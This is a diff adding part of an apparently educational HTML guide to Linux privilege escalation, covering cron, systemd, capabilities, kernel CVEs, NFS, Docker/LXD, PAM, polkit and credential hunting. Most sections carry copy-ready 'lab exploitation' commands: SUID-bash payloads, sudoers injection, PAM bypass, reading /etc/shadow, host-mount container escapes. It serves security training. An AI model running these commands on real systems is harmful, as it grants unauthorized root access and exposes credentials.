+        <li>The process uses <code>bash -p</code> which ignores PATH for security.</li>
+        <li>You don't have write access to an earlier PATH directory.</li>
+      </ul>
+    </section>
+
+    <!-- ==================== LINUX CRON ==================== -->
+    <section class="section" id="linux-cron">
+      <h2>⏰ Linux — Cron Jobs</h2>
+      <span class="reliability rel-green">🟢 Reliable — if the trigger is predictable</span>
+
+      <div class="section-intro">
+        <strong>Cron is a trust machine.</strong> It runs scripts on a schedule as a specified user — often root. If any part of what it runs is under your control, you have a path to that user's privileges.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Cron runs scheduled tasks at fixed times or intervals.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Cron jobs often run as root, use relative paths, and reference scripts in writable directories.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How to enumerate</span>
+          <p><code>cat /etc/crontab</code>, <code>ls -la /etc/cron.*</code>, <code>crontab -l</code>, and check for writable scripts referenced.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After sudo and SUID — cron is a common third path.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">cat /etc/crontab</span>
+<span class="cmd">ls -la /etc/cron.*</span>
+<span class="cmd">crontab -l</span>
+<span class="cmd">ls -la /var/spool/cron/crontabs/</span>
+<span class="cmd">systemctl list-timers --all</span>   <span class="comment"># Check systemd timers (modern replacement)</span></pre>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> Cron job runs as root (check the user field in /etc/crontab)<br>
+        <span class="ok">[✓]</span> The script or binary it runs is writable by you<br>
+        <span class="ok">[✓]</span> OR the directory it lives in is writable<br>
+        <span class="ok">[✓]</span> OR it uses a relative path and PATH is writable<br>
+        <span class="ok">[✓]</span> The schedule is predictable (you know when it runs)
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Writable Cron Script</h5>
+        <p>If a cron job runs a script as root and you can write to that script:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Identify the writable script</span>
+<span class="cmd">ls -la /path/to/cron-script.sh</span>
+
+<span class="comment"># 2. Modify it to drop a SUID bash</span>
+<span class="cmd">echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/cron-script.sh</span>
+
+<span class="comment"># 3. Wait for cron to run (check schedule)</span>
+<span class="comment"># 4. Execute the SUID bash</span>
+<span class="cmd">/tmp/rootbash -p</span>
+<span class="cmd">id</span>   <span class="comment"># uid=0(root)</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — Writable Directory in Cron Path</h5>
+        <p>If a cron job uses a relative path or an unspecified PATH:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># If the cron job runs a script that calls a command without a full path</span>
+<span class="comment"># Create a malicious version in a directory the cron job searches</span>
+<span class="cmd">echo '/bin/bash -p' > /writable-dir/command-name</span>
+<span class="cmd">chmod +x /writable-dir/command-name</span>
+<span class="comment"># Wait for cron to trigger</span></pre>
+        </div>
+      </div>
+
+      <div class="mental-model">
+        <div class="title">🧠 Mental model for cron</div>
+        <p>Ask: "What does this job run, as whom, and can I modify any part of it — the script, the directory, the PATH, or the binary it calls?"</p>
+      </div>
+
+      <div class="callout warn">
+        <strong>Modern Linux note:</strong> Since Debian 12 (Bookworm) and other modern distributions, many scheduled tasks use <strong>systemd timers</strong> instead of traditional cron. Check <code>systemctl list-timers --all</code> alongside cron files.
+      </div>
+
+      <h4>If it doesn't work</h4>
+      <ul>
+        <li>The cron job runs as a non-root user.</li>
+        <li>The script or directory is not writable.</li>
+        <li>The script uses absolute paths and you can't touch any referenced binary.</li>
+        <li>You can't wait for the trigger (e.g., it runs once a day and you're impatient).</li>
+      </ul>
+    </section>
+
+    <!-- ==================== LINUX SYSTEMD ==================== -->
+    <section class="section" id="linux-systemd">
+      <h2>🔧 Linux — Systemd Services</h2>
+      <span class="reliability rel-green">🟢 Reliable — if unit or binary is writable</span>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Systemd manages services via unit files in <code>/etc/systemd/system/</code> and related dirs.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Writable unit files or service binaries let you run commands as the service user (often root).</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>systemctl list-units --type=service</code>, then check <code>ExecStart</code> paths and permissions.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>When you spot a custom service or a writable unit file.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">systemctl list-units --type=service</span>
+<span class="cmd">find /etc/systemd/system -writable 2>/dev/null</span>
+<span class="cmd">cat /etc/systemd/system/*.service | grep ExecStart</span></pre>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Writable Systemd Unit</h5>
+        <p>If you can write to a systemd unit file that runs as root:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Modify the ExecStart to run a reverse shell or add SUID</span>
+<span class="cmd">echo 'ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"' >> /etc/systemd/system/vulnerable.service</span>
+
+<span class="comment"># 2. Reload and restart the service</span>
+<span class="cmd">systemctl daemon-reload</span>
+<span class="cmd">systemctl restart vulnerable.service</span>
+
+<span class="comment"># 3. Execute SUID bash</span>
+<span class="cmd">/tmp/rootbash -p</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== LINUX CAPABILITIES ==================== -->
+    <section class="section" id="linux-caps">
+      <h2>🧩 Linux — Capabilities</h2>
+      <span class="reliability rel-green">🟢 Reliable — if a dangerous capability is set</span>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Capabilities break root privileges into smaller, assignable pieces (e.g., <code>cap_setuid</code>, <code>cap_sys_admin</code>).</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Some capabilities allow direct privilege escalation — <code>cap_setuid</code> lets a binary change its UID to 0.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>getcap -r / 2>/dev/null</code> to find binaries with capabilities.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>When standard SUID/sudo paths are empty — capabilities are a common hidden vector.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">getcap -r / 2>/dev/null</span>
+<span class="cmd">setcap cap_setuid+ep /path/to/binary</span>  <span class="comment"># Lab example</span></pre>
+      </div>
+
+      <h4>Dangerous capabilities</h4>
+      <ul>
+        <li><code>cap_setuid</code> — change UID to 0.</li>
+        <li><code>cap_setgid</code> — change GID.</li>
+        <li><code>cap_sys_admin</code> — mount filesystems, many privileged operations.</li>
+        <li><code>cap_sys_ptrace</code> — attach to processes.</li>
+        <li><code>cap_dac_read_search</code> — bypass file read permissions.</li>
+        <li><code>cap_dac_override</code> — bypass file write permissions.</li>
+      </ul>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> A binary has a capability like <code>cap_setuid+ep</code><br>
+        <span class="ok">[✓]</span> You can execute that binary<br>
+        <span class="ok">[✓]</span> The binary's functionality allows you to abuse the capability<br>
+        <span class="ok">[✓]</span> The capability is effective (not just permitted)<br>
+        <span class="ok">[✓]</span> The kernel supports the capability in this context
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Capability Abuse</h5>
+        <p><strong>cap_setuid</strong> — if a python binary has cap_setuid:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</span></pre>
+        </div>
+
+        <p><strong>cap_dac_read_search</strong> — read files you normally can't (e.g., /etc/shadow):</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">/path/to/binary-with-cap /etc/shadow</span></pre>
+        </div>
+
+        <p><strong>cap_sys_admin</strong> — mount filesystems or manipulate namespaces. In a lab, this can often be leveraged to escape containers or mount the host disk.</p>
+      </div>
+    </section>
+
+    <!-- ==================== LINUX KERNEL ==================== -->
+    <section class="section" id="linux-kernel">
+      <h2>💥 Linux — Kernel Exploits</h2>
+      <span class="reliability rel-yellow">🟡 Environment-dependent — risky, version-specific</span>
+
+      <div class="section-intro">
+        <strong>Kernel exploits are a last resort.</strong> They can crash the system, require exact version matches, and are often unreliable. Try configuration-based paths first.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>A vulnerability in the Linux kernel itself that allows privilege escalation.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why risky</span>
+          <p>Kernel bugs can panic the system. Exploits are version-specific and architecture-specific.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>uname -a</code>, <code>cat /etc/os-release</code>, then match against known CVEs.</p>
+        </div>
+        <div class="why-card">
+          <span class="label limit">Limitations</span>
+          <p>Needs exact kernel version, right architecture, and sometimes specific configs. Test in a lab first.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">uname -a</span>
+<span class="cmd">cat /etc/os-release</span>
+<span class="cmd">cat /proc/version</span></pre>
+      </div>
+
+      <div class="flow">
+        <span class="step">Enumerate kernel</span>
+        <span class="arrow">→</span>
+        <span class="step">Identify CVE</span>
+        <span class="arrow">→</span>
+        <span class="step">Check compatibility</span>
+        <span class="arrow">→</span>
+        <span class="step">Validate in lab</span>
+        <span class="arrow">→</span>
+        <span class="step">Remediate (patch)</span>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> Kernel version matches a known vulnerable version<br>
+        <span class="ok">[✓]</span> Architecture matches (x86_64, ARM64, etc.)<br>
+        <span class="ok">[✓]</span> Required kernel configs are present<br>
+        <span class="ok">[✓]</span> Exploit compiles/runs for this environment<br>
+        <span class="ok">[✓]</span> You have a stable lab snapshot to restore<br>
+        <span class="no">[ ]</span> The system has no other easier path
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Kernel CVE Workflow</h5>
+        <p>Kernel exploitation is version-specific. In a lab, the workflow is:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Identify the exact kernel version</span>
+<span class="cmd">uname -r</span>
+<span class="cmd">cat /etc/os-release</span>
+
+<span class="comment"># 2. Search for known exploits matching the version</span>
+<span class="cmd">searchsploit "linux kernel" | grep -i "privilege"</span>
+<span class="cmd">searchsploit linux kernel 5.8</span>
+
+<span class="comment"># 3. Transfer the exploit to the target (via wget, nc, etc.)</span>
+<span class="comment"># 4. Compile if needed</span>
+<span class="cmd">gcc exploit.c -o exploit</span>
+<span class="cmd">chmod +x exploit</span>
+
+<span class="comment"># 5. Run it</span>
+<span class="cmd">./exploit</span>
+<span class="cmd">id</span>   <span class="comment"># Check if you're root</span></pre>
+        </div>
+
+        <p><strong>Common kernel CVEs in older labs:</strong></p>
+        <ul>
+          <li><strong>Dirty COW</strong> (CVE-2016-5195) — Linux < 4.8.3</li>
+          <li><strong>Dirty Pipe</strong> (CVE-2022-0847) — Linux 5.8 – 5.16.11</li>
+          <li><strong>PwnKit</strong> (CVE-2021-4034) — polkit's pkexec</li>
+          <li><strong>Baron Samedit</strong> (CVE-2021-3156) — sudo heap overflow</li>
+        </ul>
+
+        <div class="callout danger" style="margin-top:1rem;">
+          <strong>Warning:</strong> Kernel exploits can crash the target. Only run them in labs you can restore, and only after all other paths have been exhausted.
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== LINUX NFS ==================== -->
+    <section class="section" id="linux-nfs">
+      <h2>📡 Linux — NFS Misconfiguration</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>NFS exports filesystems to other machines. <code>no_root_squash</code> trusts the client's root user.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>If <code>no_root_squash</code> is set, root on the client is root on the server — you can create SUID binaries on the share.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>cat /etc/exports</code> on server, <code>showmount -e target</code> from client.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>When NFS is present and you can mount the share.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">cat /etc/exports</span>
+<span class="cmd">showmount -e target</span>
+<span class="cmd">mount -t nfs target:/share /mnt</span></pre>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — no_root_squash</h5>
+        <p>If a share is exported with <code>no_root_squash</code> and you have root on your attacking machine:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux (attacker)</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Mount the NFS share</span>
+<span class="cmd">mkdir /tmp/nfs</span>
+<span class="cmd">mount -t nfs target:/share /tmp/nfs</span>
+
+<span class="comment"># 2. Create a SUID bash binary on the share</span>
+<span class="cmd">cp /bin/bash /tmp/nfs/rootbash</span>
+<span class="cmd">chmod +s /tmp/nfs/rootbash</span>
+
+<span class="comment"># 3. On the target, execute it</span>
+<span class="cmd">/share/rootbash -p</span>
+<span class="cmd">id</span>   <span class="comment"># uid=0(root)</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== LINUX CONTAINERS ==================== -->
+    <section class="section" id="linux-docker">
+      <h2>🐳 Linux — Containers</h2>
+
+      <div class="section-intro">
+        <strong>Being in the <code>docker</code> group is effectively root.</strong> The Docker daemon runs as root and trusts anyone who can talk to its socket. That trust is the vulnerability.
+      </div>
+
+      <h3>Container Privilege Boundaries</h3>
+      <div class="code-block">
+        <pre>Host
+│
+├── Docker
+│   ├── docker.sock          ← full root access
+│   ├── docker group         ← can talk to socket
+│   └── privileged container ← can escape
+│
+├── LXC/LXD                  ← system container, high risk
+│
+├── Kubernetes               ← RBAC, secrets, hostPath
+│
+└── Other runtimes</pre>
+      </div>
+
+      <h4>Container privilege ≠ automatically host root</h4>
+      <p>Containers are designed to isolate. You need specific conditions to escape:</p>
+      <ul>
+        <li><strong>Docker socket exposure</strong> — the socket is the API to root.</li>
+        <li><strong>--privileged flag</strong> — removes most isolation.</li>
+        <li><strong>hostPath mounts</strong> — host filesystem accessible inside container.</li>
+        <li><strong>CAP_SYS_ADMIN</strong> — allows mount operations.</li>
+        <li><strong>Kernel vulnerabilities</strong> — escape via kernel bug (rare).</li>
+      </ul>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">groups</span>            <span class="comment"># Check for docker group</span>
+<span class="cmd">ls -la /var/run/docker.sock</span></pre>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> You are in <code>docker</code> group OR socket is writable<br>
+        <span class="ok">[✓]</span> The Docker daemon is running<br>
+        <span class="ok">[✓]</span> You can pull/run an image (or have one locally)<br>
+        <span class="ok">[✓]</span> You can mount the host root filesystem<br>
+        <span class="ok">[✓]</span> The container can access the host filesystem
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Docker Group</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Mount the host filesystem inside a container</span>
+<span class="cmd">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span>
+<span class="comment"># You are now root on the host filesystem</span>
+
+<span class="comment"># Alternative: add your user to sudoers via the container</span>
+<span class="cmd">docker run -v /:/mnt --rm -it alpine sh -c 'echo "hacker ALL=(ALL) NOPASSWD: ALL" >> /mnt/etc/sudoers'</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — Writable Docker Socket</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># If /var/run/docker.sock is writable</span>
+<span class="cmd">docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — LXD / LXC Group</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Import a small image</span>
+<span class="cmd">lxc image import ./alpine.tar.gz --alias myimage</span>
+
+<span class="comment"># Create a privileged container</span>
+<span class="cmd">lxc init myimage mycontainer -c security.privileged=true</span>
+
+<span class="comment"># Mount host root into container</span>
+<span class="cmd">lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true</span>
+
+<span class="comment"># Start and enter</span>
+<span class="cmd">lxc start mycontainer</span>
+<span class="cmd">lxc exec mycontainer /bin/sh</span>
+<span class="comment"># Inside: access /mnt/root as root</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== LINUX ACL ==================== -->
+    <section class="section" id="linux-acl">
+      <h2>📋 Linux — POSIX ACLs</h2>
+
+      <div class="section-intro">
+        <strong>Permissions are not just rwx.</strong> POSIX ACLs extend the traditional model and can grant additional access you'd miss with <code>ls -la</code>.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>POSIX Access Control Lists add per-user and per-group permissions beyond owner/group/other.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why it matters</span>
+          <p>A file may look unremarkable with <code>ls -la</code> but have an ACL granting your user write access — that's an escalation path you'd miss.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>getfacl /path/to/file</code> to view, <code>setfacl</code> to modify.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>When standard permissions look safe but you suspect additional access.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">getfacl /path/to/file</span>   <span class="comment"># View ACL</span>
+<span class="cmd">setfacl -m u:john:rwx /path/to/file</span>  <span class="comment"># Lab example</span></pre>
+      </div>
+
+      <div class="flow">
+        <span class="step">Traditional perms</span>
+        <span class="arrow">+</span>
+        <span class="step">POSIX ACL</span>
+        <span class="arrow">=</span>
+        <span class="step">Effective access</span>
+      </div>
+    </section>
+
+    <!-- ==================== LINUX PAM ==================== -->
+    <section class="section" id="linux-pam">
+      <h2>🔐 Linux — PAM</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Pluggable Authentication Modules — the framework Linux uses for authentication (login, sudo, ssh, etc.).</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why it matters</span>
+          <p>Misconfigured PAM modules, writable PAM config files, or vulnerable modules can create authentication bypasses or privilege escalation.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>cat /etc/pam.d/</code> — check for writable configs and unusual modules.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>Advanced — when standard paths are exhausted and you suspect auth-layer weaknesses.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">ls -la /etc/pam.d/</span>
+<span class="cmd">cat /etc/pam.d/su</span>
+<span class="cmd">cat /etc/pam.d/sudo</span></pre>
+      </div>
+
+      <div class="callout warn">
+        <strong>Label carefully:</strong> A writable PAM config is a <em>misconfiguration</em>. A bug in a PAM module is a <em>software vulnerability</em>. Different remediation.
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Writable PAM Config</h5>
+        <p>If you can write to a PAM config file used by <code>su</code> or <code>sudo</code>, you can disable authentication checks:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Comment out pam_unix.so in /etc/pam.d/su</span>
+<span class="cmd">sed -i 's/^auth.*pam_unix.so/#&/' /etc/pam.d/su</span>
+<span class="comment"># Now su root works without a password</span>
+<span class="cmd">su root</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== LINUX POLKIT ==================== -->
+    <section class="section" id="linux-polkit">
+      <h2>🛂 Linux — Polkit</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Polkit (formerly PolicyKit) is an authorization framework that lets unprivileged processes talk to privileged services.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why it matters</span>
+          <p>Misconfigured polkit policies or vulnerable versions (e.g., CVE-2021-4034 PwnKit) can lead to root.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Check <code>pkexec</code> SUID status, polkit version, and policy files in <code>/usr/share/polkit-1/actions/</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>When you see <code>pkexec</code>, or the polkit version is old.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">pkexec --version</span>
+<span class="cmd">find / -perm -4000 -name "pkexec" 2>/dev/null</span>
+<span class="cmd">ls /usr/share/polkit-1/actions/</span></pre>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — PwnKit (CVE-2021-4034)</h5>
+        <p>If the target runs a vulnerable polkit version and <code>pkexec</code> is SUID:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Public PoC compiles to a binary that exploits pkexec to get root</span>
+<span class="comment"># Typical usage (from an official PoC, in a lab):</span>
+<span class="cmd">gcc cve-2021-4034.c -o pwnkit</span>
+<span class="cmd">./pwnkit</span>
+<span class="cmd">id</span>   <span class="comment"># uid=0(root)</span></pre>
+        </div>
+      </div>
+
+      <div class="callout warn">
+        <strong>Separate labels:</strong> A weak polkit policy is a <em>misconfiguration</em>. CVE-2021-4034 (PwnKit) is a <em>software vulnerability</em>. Do not mix them.
+      </div>
+    </section>
+
+    <!-- ==================== LINUX DBUS ==================== -->
+    <section class="section" id="linux-dbus">
+      <h2>🚌 Linux — D-Bus</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>D-Bus is a message bus for inter-process communication on Linux. The system bus connects privileged services to unprivileged clients.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why it matters</span>
+          <p>Exposed privileged D-Bus interfaces can be called by any local user — if the interface performs privileged actions without proper validation, you can escalate.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>busctl list</code>, <code>dbus-send</code>, <code>gdbus</code> to enumerate services and interfaces.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>Advanced — when standard paths are exhausted and you notice unusual D-Bus services.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">busctl list</span>
+<span class="cmd">busctl introspect org.freedesktop.systemd1 /org/freedesktop/systemd1</span></pre>
+      </div>
+    </section>
+
+    <!-- ==================== LINUX CREDENTIALS ==================== -->
+    <section class="section" id="linux-credentials">
+      <h2>🔑 Linux — Credentials</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Passwords, keys, tokens stored in files, history, environment, or configs.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>A found credential may let you <code>su</code>, <code>ssh</code>, or authenticate to a service as another user.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Grep for "password", "passwd", "secret", "key" in configs and history files.</p>
+        </div>
+        <div class="why-card">
+          <span class="label limit">Limitations</span>
+          <p>A found credential may be expired, invalid, or for a different host. Always test carefully.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">cat ~/.bash_history</span>
+<span class="cmd">grep -ri "password" /var/www 2>/dev/null</span>
+<span class="cmd">env</span>
+<span class="cmd">find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -i "pass" 2>/dev/null</span></pre>
+      </div>
+
+      <h4>Credential Discovery vs Use</h4>
+      <div class="detection-box">
+        <div class="detect-card red">
+          <span class="hdr">🔴 Discovery</span>
+          Finding credentials in files, history, or configs.
+        </div>
+        <div class="detect-card blue">
+          <span class="hdr">🔵 Use</span>
+          Authenticating with those credentials to gain access.
+        </div>
+        <div class="detect-card green">
+          <span class="hdr">🟢 Mitigation</span>
+          Rotate secrets. Use vaults. Never store plaintext credentials.
+        </div>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Credential Use</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># If you find a password for user "admin":</span>
+<span class="cmd">su admin</span>
+<span class="cmd">ssh admin@target</span>
+
+<span class="comment"># If you find an SSH private key:</span>
+<span class="cmd">chmod 600 id_rsa</span>
+<span class="cmd">ssh -i id_rsa admin@target</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== LINUX TOOLS ==================== -->
+    <section class="section" id="linux-tools">
+      <h2>🛠️ Linux Enumeration Tools</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Automated scripts that scan for common privilege escalation indicators.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why useful</span>
+          <p>They save time and surface things you might forget to check manually.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Run in a lab, review output, then <strong>manually verify</strong> each finding.</p>
+        </div>
+        <div class="why-card">
+          <span class="label limit">Limitations</span>
+          <p>False positives are common. A tool highlighting something does not mean it's exploitable.</p>
+        </div>
+      </div>
+
+      <div class="card">
+        <h4>LinPEAS</h4>
+        <p>Automated enumeration script. Highlights potential escalation paths. <strong>Does not prove exploitability.</strong></p>
+      </div>
+      <div class="card">
+        <h4>Linux Smart Enumeration (LSE)</h4>
+        <p>Configurable enumeration script with levels of detail.</p>
+      </div>
+      <div class="card">
+        <h4>pspy</h4>
+        <p>Monitors processes without root. Useful for catching cron jobs and short-lived processes.</p>
+      </div>
+
+      <div class="callout warn">
+        <strong>Verify manually!</strong> Tools produce false positives. Always confirm the root cause before attempting exploitation.
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS FUNDAMENTALS ==================== -->
+    <section class="section" id="win-fundamentals">
+      <h2>🪟 Windows — Fundamentals</h2>
+
+      <div class="section-intro">
+        <strong>Windows privilege is about tokens, integrity levels, and rights.</strong> Unlike Linux's simpler user/group model, Windows has multiple layers — and privilege escalation usually means obtaining or abusing a token with higher integrity or specific rights.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Windows security principals: users, groups, SIDs, tokens, integrity levels, and privileges.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>Understanding the model is required to know which boundary you're crossing and why a technique works.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>whoami /priv</code>, <code>whoami /groups</code>, <code>whoami /all</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>First thing after getting a shell — know what you have.</p>
+        </div>
+      </div>
+
+      <p><strong>Users & Groups:</strong> Windows uses Security Identifiers (SIDs). <code>SYSTEM</code> (S-1-5-18) is the highest privilege. <code>Administrator</code> is a member of Administrators group.</p>
+      <p><strong>Tokens:</strong> Access tokens define what a process can do. <strong>Integrity levels:</strong> Low, Medium, High, System.</p>
+      <p><strong>UAC:</strong> User Account Control — even admins run with a filtered token until elevation.</p>
+
+      <div class="mental-model">
+        <div class="title">🧠 Mental model for Windows</div>
+        <p>Ask: "What token does this process have, what integrity level is it, and what can I do to get a higher one?"</p>
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS ENUM ==================== -->
+    <section class="section" id="win-enum">
+      <h2>🔎 Windows — Enumeration</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Gathering user, group, privilege, service, task, and permission information.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>You can't pick a path without knowing the system's trust relationships.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
